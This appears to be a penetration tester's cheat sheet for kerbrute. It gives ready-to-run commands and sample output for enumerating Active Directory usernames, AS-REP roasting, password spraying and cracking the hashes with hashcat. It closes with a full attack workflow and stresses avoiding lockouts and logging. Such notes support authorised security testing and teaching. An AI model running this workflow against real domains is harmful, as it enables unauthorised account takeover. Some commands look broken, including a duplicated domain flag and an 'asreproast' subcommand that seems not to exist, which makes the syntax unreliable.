**Binary for `kerbrute` is in Cracks**

> **Reference:** [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

---
# Kerbrute — Kerberos User Enumeration & AS-REP Roasting

!!! tip "Tip"
    `kerbrute userenum --dc <dc-ip> -d <domain> userlist.txt` validates usernames without lockout (Kerberos pre-auth errors don't trigger lockout by default). Start with `jsmith`, `john.smith`, `jsmith@domain` format variations — AD environments vary in UPN format.

---

## Key Features

|Feature|Description|
|---|---|
|User Enumeration|Finds valid domain users via Kerberos error responses|
|AS-REP Roasting|Identifies users without pre-auth (`Do not require Kerberos pre-auth`)|
|Password Spraying|Attempts login with a single password across multiple users|
|Fast & Parallel|Written in Go — highly performant and scriptable|
|Safe for Testing|Doesn't touch SMB or LDAP — just Kerberos|

---

## Installation

You need Go installed:

```bash
git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build
chmod +x kerbrute_... # if using Linux binary
```

Or download precompiled binaries from the [Releases](https://github.com/ropnop/kerbrute/releases) page.

---

## Syntax Summary

```bash
./kerbrute [command] [flags]
```

---

## Common Commands & Usage

### 1. Enumerate Valid Usernames

```bash
kerbrute userenum --dc <DC_IP> -d <domain> users.txt
```

- Sends AS-REQs without pre-auth to determine if usernames exist
    
- Based on KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN vs. KRB5KDC_ERR_PREAUTH_REQUIRED
    
- Works even if anonymous LDAP is blocked
    

**Example:**

```bash
kerbrute userenum -d hokkaido-aerospace.com --dc 10.10.10.10 -d corp.local users.txt
```

Expected output:

```
[+] VALID USERNAME: jdoe@corp.local
[-] INVALID USERNAME: hruser@corp.local
```

Optionally, if you are unaware of any valid usernames, attempt to brute-force them by using the following syntax and wordlist:
```bash
kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.183.40 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100
```

---

### 2. Find AS-REP Roastable Users

```bash
kerbrute asreproast --dc <DC_IP> -d <domain> users.txt
```

- Extracts **TGTs for accounts with no pre-auth**
    
- Output is in John/hashcat-compatible `$krb5asrep$` format
    

**Example:**

```bash
kerbrute asreproast --dc 10.10.10.10 -d corp.local users.txt
```

Output:

```bash
[+] FOUND AS-REP Roastable User: svc_backup@corp.local
$krb5asrep$23$svc_backup@CORP.LOCAL:...hash...
```

You can crack this with:

```bash
hashcat -m 18200 hashes.txt rockyou.txt
```

---

### 3. Kerberos Password Spraying

```bash
kerbrute passwordspray --dc <DC_IP> -d <domain> users.txt --password <Password123>
```

Example:

```bash
kerbrute passwordspray --dc 10.10.10.10 -d corp.local users.txt --password "Summer2023!"
```

Output:

```plaintext
[+] VALID LOGIN: jdoe@corp.local:Summer2023!
```

> Good for stealthy single-password attempts across many users

---

## Operational Notes

- Works **only if UDP/88 or TCP/88 is reachable**
    
- **Does not require domain join or admin rights**
    
- Avoids logging on SMB/WinRM — makes it quieter than `nxc smb` sprays
    
- Combine with `ldapsearch` or BloodHound output to build user wordlists
    

---

## Summary: kerbrute Usage

|Task|Command Example|
|---|---|
|User enumeration|`kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt`|
|AS-REP roasting|`kerbrute asreproast -d corp.local --dc 10.10.10.10 users.txt`|
|Password spraying|`kerbrute passwordspray -d corp.local --dc 10.10.10.10 users.txt --password Pass123`|
|Compile from source|`go build` in the repo folder|
|Crack AS-REP hashes|`hashcat -m 18200 asrep.txt rockyou.txt`|

---

## Best Practice Workflow

```bash
# Step 1: Enumerate users (null SMB/LDAP fails)
kerbrute userenum -d domain.local --dc <DC> users.txt > valid.txt

# Step 2: Identify AS-REP roastable users
kerbrute asreproast -d domain.local --dc <DC> valid.txt > roast.txt

# Step 3: Crack hashes offline
hashcat -m 18200 roast.txt rockyou.txt

# Step 4: Try password spraying if needed
kerbrute passwordspray -d domain.local --dc <DC> valid.txt --password "Welcome1"
```